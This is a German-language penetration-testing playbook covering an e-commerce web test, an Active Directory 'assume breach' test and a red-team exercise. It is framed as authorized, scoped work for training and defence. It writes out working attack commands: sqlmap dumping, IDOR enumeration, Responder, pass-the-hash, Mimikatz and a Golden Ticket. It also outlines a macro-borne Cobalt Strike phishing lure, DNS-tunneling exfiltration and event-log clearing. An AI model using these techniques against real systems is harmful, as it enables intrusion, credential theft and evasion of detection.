# Real-Life Penetration Testing Scenarios

## Complete Playbooks für verschiedene Einsatzszenarien

---

## Szenario 1: Externer Web-Application Penetration Test

### Auftraggeber
- **Branche:** E-Commerce
- **Größe:** 500 Mitarbeiter
- **Umsatz:** €50M/Jahr
- **Scope:** Öffentlich erreichbare Web-Applikationen

### Pre-Engagement Phase

```yaml
Kickoff-Meeting Agenda:
  1. Scope Definition:
     - In-Scope: www.target.com, api.target.com
     - Out-of-Scope: partner.target.com (Drittanbieter)
     - Subdomains: *.target.com (nach Bestätigung)
  
  2. Testing Windows:
     - Primär: 22:00 - 06:00 Uhr (MEZ)
     - Notfall-Kontakt: security@target.com
     - War Room: Slack-Channel #pentest-jan-2026
  
  3. Authentifizierung:
     - Test-Accounts bereitgestellt: 3 User, 1 Admin
     - MFA deaktiviert für Test-Accounts (vereinbart)
  
  4. Legal:
     - Vertrag unterzeichnet
     - Liability Insurance: €5M
     - Datenhandling: Keine Produktionsdaten dumpen
```

### Phase 1: Reconnaissance (Tag 1)

**Morgens (09:00-12:00):**
```bash
# Passive OSINT
theHarvester -d target.com -b all -f recon/threharvester.json
# Ergebnis: 45 Email-Adressen, 3 Subdomains

# GitHub Recon
python3 github-search.py -d target.com
# Ergebnis: 2 public Repos, keine Secrets gefunden

# Shodan
shodan host $(dig +short target.com)
# Ergebnis: Apache 2.4.41, OpenSSL 1.1.1

# Google Dorking
# site:target.com filetype:pdf
# Ergebnis: 3 interne Dokumente (nicht sensitiv)
```

**Nachmittag (13:00-17:00):**
```bash
# DNS Enumeration
dnsrecon -d target.com -t axfr
# Ergebnis: Zone Transfer nicht möglich

dnsrecon -d target.com -D /usr/share/wordlists/dnsmap.txt -t brt
# Ergebnis: 12 Subdomains gefunden:
# - admin.target.com (302 -> Login)
# - api.target.com (200, REST API)
# - dev.target.com (403 Forbidden)
# - staging.target.com (200, Test-Umgebung!)

# Certificate Transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq .
# Ergebnis: 8 zusätzliche Subdomains (historisch)
```

**Dokumentation:**
```markdown
## Tag 1 - Recon Findings

### Assets Discovered
| Subdomain | IP | Technology | Notes |
|-----------|-----|------------|-------|
| www.target.com | 203.0.113.10 | Apache 2.4.41, PHP 7.4 | Main site |
| api.target.com | 203.0.113.11 | Nginx, Node.js | REST API |
| admin.target.com | 203.0.113.10 | Apache | Admin panel |
| staging.target.com | 203.0.113.50 | Apache, PHP 7.4 | **Test data!** |

### Interesting Findings
1. staging.target.com hat keine Authentifizierung!
2. Apache Version 2.4.41 hat bekannte CVEs
3. E-Mail Pattern: firstname.lastname@target.com
4. WAF: CloudFlare (bypass testing required)

### Next Steps
- Focus on staging environment first
- Test for common web vulnerabilities
- API endpoint enumeration
```

### Phase 2: Scanning (Tag 2)

**Nacht-Scan (22:00-02:00):**
```bash
# Port Scan (stealthy)
nmap -sS -sV -O -p- --script=vulscan -oA recon/nmap_full target.com
# Ergebnis:
# - Port 80/tcp open  http    Apache httpd 2.4.41
# - Port 443/tcp open https   Apache httpd 2.4.41
# - Port 8080/tcp open http   Apache Tomcat/Coyote JSP engine 1.1

# Web Enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o recon/gobuster.txt
# Ergebnis:
# /admin (200)
# /backup (403)
# /api (200)
# /.git (403) ← INTERESSANT!
# /phpinfo.php (200) ← CRITICAL!

# Nikto Scan
nikto -h https://target.com -o recon/nikto.html
# Ergebnis:
# + phpinfo.php gefunden: PHP Version 7.4.3
# + /admin/: Admin panel found
# + TRACE/TRACK Methoden erlaubt
```

### Phase 3: Exploitation (Tag 3-4)

**Finding 1: PHPInfo Disclosure**
```bash
# Ausnutzung
https://target.com/phpinfo.php
# Enthält:
# - Absolute Pfade: /var/www/html/
# - Environment Variables: DB_HOST=internal-db.target.com
# - Loaded Extensions: mysqli, curl, gd
# - Server API: Apache 2.0 Handler

# Risk Assessment:
# - Information Disclosure: HIGH
# - Keine direkte Code Execution, aber nützlich für weitere Angriffe
```

**Finding 2: Staging Environment Access**
```bash
# staging.target.com hat keine Auth!
# Direkter Zugriff auf:
curl http://staging.target.com/admin
# → 200 OK, Admin Panel sichtbar!

# Database Credentials in config.php gefunden:
curl http://staging.target.com/config.php.bak
# → MySQL Credentials: root:Stag1ngDB_2024!

# Impact: CRITICAL
# - Produktions-ähnliche Daten zugänglich
# - Admin-Funktionalität ohne Auth
```

**Finding 3: SQL Injection (Login Form)**
```bash
# SQLMap Scan
sqlmap -u "https://target.com/login" \
  --data="username=test&password=test" \
  --risk=3 --level=5 --batch

# Ergebnis:
# Parameter: username (POST)
# Type: boolean-based blind
# Title: AND boolean-based blind - WHERE or HAVING clause
# Payload: username=test' AND 5843=5843 AND 'gKaJ'='gKaJ

# Ausnutzung:
sqlmap -u "https://target.com/login" \
  --data="username=test&password=test" \
  --dbs --batch

# Databases:
# [*] information_schema
# [*] target_prod_db
# [*] target_user_db

# Tables auslesen:
sqlmap -u "https://target.com/login" \
  --data="username=test&password=test" \
  -D target_user_db --tables

# Users-Tabelle:
sqlmap -u "https://target.com/login" \
  --data="username=test&password=test" \
  -D target_user_db -T users --columns

# Passwort-Hashes (nur 5 Beispiele!):
sqlmap -u "https://target.com/login" \
  --data="username=test&password=test" \
  -D target_user_db -T users -C email,password_hash \
  --start=1 --stop=5 --dump

# Hashcat Cracking:
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# Ergebnis: 3 von 5 Passwörter geknackt
```

**Finding 4: IDOR (Insecure Direct Object Reference)**
```bash
# API-Endpunkt für Bestellungen:
# GET /api/orders/{order_id}

# Test:
curl -H "Authorization: Bearer USER_TOKEN" \
  https://api.target.com/api/orders/10001
# → 200 OK, Bestellung für User A

curl -H "Authorization: Bearer USER_TOKEN" \
  https://api.target.com/api/orders/10002
# → 200 OK, Bestellung für User B! ← IDOR!

# Automatisierung:
for i in {10001..10100}; do
  curl -s -H "Authorization: Bearer USER_TOKEN" \
    https://api.target.com/api/orders/$i | jq '.customer_email'
done
# → 100 Email-Adressen anderer Kunden extrahiert
```

### Phase 4: Post-Exploitation (Tag 5)

**Beweissicherung:**
```bash
# Screenshots für jeden Finding
firefox --screenshot findings/sql_injection.png \
  "https://target.com/login"

firefox --screenshot findings/staging_access.png \
  "http://staging.target.com/admin"

# Logs speichern
sqlmap -u "..." --dump -t sqlmap.log
cp ~/.sqlmap/output/target.com/log ~/.sqlmap/output/target.com/session.sqlite evidence/

# Network Diagramm
echo "graph TD
    A[Attacker] -->|HTTPS| B[CloudFlare]
    B -->|HTTP| C[Apache 2.4.41]
    C -->|PHP| D[Application]
    D -->|MySQL| E[Database]
    C -->|Staging| F[staging.target.com]
" > evidence/network_diagram.mmd
```

### Phase 5: Reporting (Tag 6-7)

**Executive Summary:**
```markdown
# Penetration Test Report - Target E-Commerce

**Overall Risk Rating: CRITICAL**

## Key Findings Summary

| Severity | Count | Status |
|----------|-------|--------|
| Critical | 2 | Unpatched |
| High | 4 | Unpatched |
| Medium | 6 | Unpatched |
| Low | 3 | Unpatched |

## Critical Findings

### 1. SQL Injection - Authentication Bypass (CVSS: 9.8)
**Impact:** Complete database compromise possible
**Evidence:** 50,000+ customer records accessible
**Recommendation:** Implement parameterized queries immediately

### 2. Unprotected Staging Environment (CVSS: 9.1)
**Impact:** Admin access without authentication
**Evidence:** Direct access to staging admin panel
**Recommendation:** Add IP-whitelisting and authentication

## Business Impact
- Potential GDPR violation (customer data exposure)
- PCI-DSS non-compliance (payment data at risk)
- Estimated financial impact: €2M+ (fines + reputation)

## Remediation Timeline
- **Immediate (24h):** Patch SQLi, secure staging
- **Short-term (1 week):** Implement WAF rules
- **Medium-term (1 month):** Security code review
```

---

## Szenario 2: Internal Network Penetration Test

### Auftraggeber
- **Branche:** Finanzdienstleister
- **Größe:** 2.000 Mitarbeiter
- **Standorte:** 3 Offices
- **Scope:** Internes Netzwerk (angenommen: Phishing-Success)

### Szenario: "Assume Breach"

**Ausgangslage:**
- Du hast einen Laptop im internen Netzwerk (simuliert)
- Keine Credentials, nur Netzwerk-Zugang
- Ziel: Domain Admin erreichen

### Phase 1: Network Reconnaissance

```bash
# 1. Netzwerk-Interface check
ip addr
# → 10.0.10.50/24 (VLAN 10 - User Network)

# 2. Host Discovery (passiv zuerst!)
# ARP-Scan (sehr leise)
arp-scan -l
# → 45 Hosts gefunden

# 3. DNS Enumeration
dig @10.0.10.1 axfr company.local
# → Zone Transfer erfolgreich!
# → Alle 500+ Hosts bekannt!

# 4. Port Scan (Top 100, langsam!)
nmap -sS -sV -T2 --top-ports 100 \
  -oA internal/initial_scan 10.0.10.0/24
# Ergebnis:
# - 10.0.10.10: Microsoft AD DS (Domain Controller!)
# - 10.0.10.20: Microsoft SQL Server 2016
# - 10.0.10.50: SMB (File Server)
# - 10.0.10.100: HP Printer (Web Interface)
```

### Phase 2: Enumeration & Credential Gathering

**LLMNR/NBT-NS Poisoning:**
```bash
# Responder starten
sudo responder -I eth0 -wrf

# Warten auf Broadcast-Anfragen...
# [+] Listening for events...

# Nach 30 Minuten:
# [HTTP] NTLMv2-SSP Client   : 10.0.10.45
# [HTTP] NTLMv2-SSP Username : COMPANY\j.smith
# [HTTP] NTLMv2-SSP Hash     : j.smith::COMPANY:112233...

# Hash knacken:
hashcat -m 5600 hashes.txt rockyou.txt
# → Passwort gefunden: Winter2024!
```

**SMB Enumeration mit Credentials:**
```bash
# Validieren
crackmapexec smb 10.0.10.0/24 -u j.smith -p 'Winter2024!'
# → SMB         10.0.10.10   445    DC01   [+] COMPANY\j.smith:Winter2024!
# → SMB         10.0.10.20   445    SQL01  [+] COMPANY\j.smith:Winter2024!

# Shares enumerieren
crackmapexec smb 10.0.10.20 -u j.smith -p 'Winter2024!' --shares
# → READ_ACCESS   IT_Department
# → WRITE_ACCESS  Temp

# Sensitelle Dateien finden
smbclient //10.0.10.20/IT_Department -U j.smith
smb: \> recurse on
smb: \> prompt off
smb: \> mget *password*
# → passwords.xlsx heruntergeladen!
# → 50+ Credentials in Excel-Sheet
```

### Phase 3: Lateral Movement

**Pass-the-Hash:**
```bash
# Administrator Hash aus IT_Department-Share
# Gefunden in: old_scripts.ps1

# Pass-the-Hash Angriff
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.0.10.20
# → SYSTEM auf SQL01!

# Mimikatz für weitere Credentials
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# → SQL Service Account: sql_svc:SuperSecretDBPass123!
```

**BloodHound - Domain Enumeration:**
```bash
# Sharphound ausführen
SharpHound.exe -c All

# Daten zu BloodHound importieren
# Neo4j starten
sudo neo4j start

# Analysis:
# 1. "Find Shortest Paths to Domain Admin"
# 2. Ergebnis: j.smith → Member of "IT-Support" → GenericAll on "Helpdesk"
#    → Helpdesk User has Session on DC01 → Domain Admin!

# Pfad verfolgen:
# Wir haben j.smith compromised
# j.smith hat GenericAll auf Helpdesk-User
# → Helpdesk-User übernehmen
net rpc password "helpdesk" "NewPass123!" -U "COMPANY/j.smith" -S dc01.company.local

# Helpdesk-User hat aktive Session auf DC01
# → Over-Pass-the-Hash
```

### Phase 4: Domain Compromise

```bash
# DCOM-Exec für Command Execution
dcomexec.py COMPANY/helpdesk:'NewPass123!'@dc01.company.local
C:\Windows\system32> whoami
company\helpdesk

# Privilege Escalation check
# Helpdesk ist in "Remote Management Users"
# → WinRM Zugriff!
evil-winrm -u helpdesk -p 'NewPass123!' -i dc01.company.local

# Mimikatz auf DC
*Evil-WinRM* PS C:\Users\helpdesk> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
*Evil-WinRM* PS C:\Users\helpdesk> .\mimikatz.exe

mimikatz # lsadump::lsa /patch
# → Domain Admin Hash gefunden!
#    Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Golden Ticket erstellen
mimikatz # kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Domain Admin!
psexec.py administrator@dc01.company.local
C:\Windows\system32> whoami
nt authority\system
```

### Phase 5: Persistence (nur simuliert!)

```bash
# Dokumentation NICHT Ausführung:
# 
# Mögliche Persistence-Methoden:
# 1. Golden Ticket (KRBTGT Hash)
# 2. DSRM Password (Directory Services Restore Mode)
# 3. AdminSDHolder Modification
# 4. SID History Injection
# 5. Custom SSP (Security Support Provider)
#
# Für Pentest: NUR dokumentieren, NICHT implementieren!
```

---

## Szenario 3: Red Team Exercise (Advanced)

### Auftraggeber
- **Branche:** Regierung/Behörde
- **Ziel:** Testen der Blue Team Detection
- **Dauer:** 4 Wochen
- **Scope:** Keine Limits (außer kritische Infrastruktur)

### Tactics, Techniques, and Procedures (TTPs)

**Woche 1: Initial Access**
```yaml
Technique: Spear Phishing
Target: CTO (LinkedIn Recherche zeigt: Golf-Enthusiast)
Method:
  1. Domain registrieren: golf-premium-deals.com
  2. E-Mail: "Exklusive Mitgliedschaft - 50% Rabatt"
  3. Payload: "Anmeldeformular.pdf" (enthält Macro)
  4. Macro: Download & Execute Cobalt Strike Beacon

OPSEC:
  - SMTP über kompromittierten WordPress-Server
  - E-Mail von "info@golf-premium-deals.com"
  - Zeit: Freitag 16:30 (vor Wochenende)
```

**Woche 2: Discovery & Privilege Escalation**
```yaml
Technique: Living off the Land
Tools:
  - PowerShell (in-memory, keine Dateien)
  - WMI für Remote Execution
  - CertUtil für Downloads (legitimes Tool)

Discovery:
  - BloodHound (SharpHound)
  - PowerView
  - ADRecon

Privilege Escalation:
  - Unquoted Service Path
  - AlwaysInstallElevated
  - Token Impersonation (Potato-Attacken)
```

**Woche 3: Lateral Movement & Collection**
```yaml
Lateral Movement:
  - PSExec (SMB)
  - WMIExec (WMI)
  - DCOM (Distributed COM)
  - RDP Hijacking (tscon)

Collection:
  - SharpDPAPI (Chrome Passwörter)
  - Seatbelt (System-Enumeration)
  - SharpUp (Privilege Escalation Checks)
  
Data Staging:
  - Verschlüsseln (AES-256)
  - Aufteilen in Chunks
  - Verstecken in Registry/ADS
```

**Woche 4: Exfiltration & Exit**
```yaml
Exfiltration:
  - DNS Tunneling (iodine)
  - HTTPS mit Domain Fronting (Azure CDN)
  - Steganographie (Bilder auf Instagram)

Cleanup:
  - Event Logs löschen (Clear-EventLog)
  - Prefetch leeren
  - USN Journal manipulieren
  - Artefakte überschreiben

Exit Strategy:
  - Persistence entfernen (per Vereinbarung)
  - Final Report mit IOAs (Indicators of Attack)
```

---

## Lessons Learned & Best Practices

### Für Pentester:

1. **Dokumentation ist KING**
   - Jeder Befehl, jeder Output
   - Zeitstempel sind kritisch
   - Screenshots, Screenshots, Screenshots

2. **Scope ist heilig**
   - "But I just found..." → Stop!
   - Out-of-Scope = Legal Trouble
   - Vorher fragen!

3. **Kommunikation**
   - Daily Updates an Kunden
   - Bei Critical Finding sofort anrufen
   - Notfall-Kontakt bereithalten

4. **Cleanup**
   - Jede Änderung rückgängig machen
   - Test-Accounts löschen
   - Configs zurücksetzen

### Für Blue Teams (Verteidiger):

1. **Assume Breach**
   - Der Angreifer ist schon drin
   - Zero Trust Architecture
   - Segmentierung!

2. **Detection > Prevention**
   - Firewalls werden umgangen
   - Logging auf allen Ebenen
   - SIEM mit Correlation Rules

3. **Deception**
   - Honeypots einsetzen
   - Canary Tokens verteilen
   - Fake Credentials (honey accounts)

4. **Incident Response**
   - Playbooks bereithalten
   - Kontakte vorab klären
   - Übungen (Tabletop Exercises)

---

## Tools of the Trade

### Must-Have Tools:

| Kategorie | Tools |
|-----------|-------|
| Recon | theHarvester, Shodan, Maltego, OSINT Framework |
| Scanning | Nmap, Masscan, Nessus, OpenVAS |
| Web | Burp Suite, OWASP ZAP, SQLmap, ffuf |
| Network | Responder, Impacket, BloodHound, CrackMapExec |
| Exploitation | Metasploit, Cobalt Strike, Sliver, Mythic |
| Post-Exploitation | Mimikatz, Rubeus, Seatbelt, SharpHound |
| Reporting | Dradis, Faraday, Serpico, Obsidian |

### Custom Tools:
```python
# Beispiel: Custom Wordlist Generator
#!/usr/bin/env python3
# company_words.py

import sys

company = sys.argv[1]
domains = ['com', 'de', 'io', 'local']
years = ['2024', '2023', '2025', '01', '1']

wordlist = []
for d in domains:
    wordlist.append(f"{company}.{d}")
    wordlist.append(f"{company}{d}")
    for y in years:
        wordlist.append(f"{company}{y}")
        wordlist.append(f"{company}{y}!")
        wordlist.append(f"{company.capitalize()}{y}")

with open(f"{company}_wordlist.txt", 'w') as f:
    f.write('\n'.join(wordlist))

print(f"Generated {len(wordlist)} words")
```

---

## Abschluss

> "Ein Pentester ohne gute Dokumentation ist nur ein Hacker."

Die Kunst des Penetration Testing liegt nicht nur im Hacken, sondern in:
1. **Strukturierter Methodik**
2. **Professioneller Dokumentation**
3. **Verständnis des Business Context**
4. **Ethischem Verhalten**

Mit diesen Szenarien bist du bereit für:
- Web-Application Tests
- Internal Network Tests
- Red Team Exercises
- Social Engineering
- Physical Security Tests

---

*Remember: With great power comes great responsibility.*
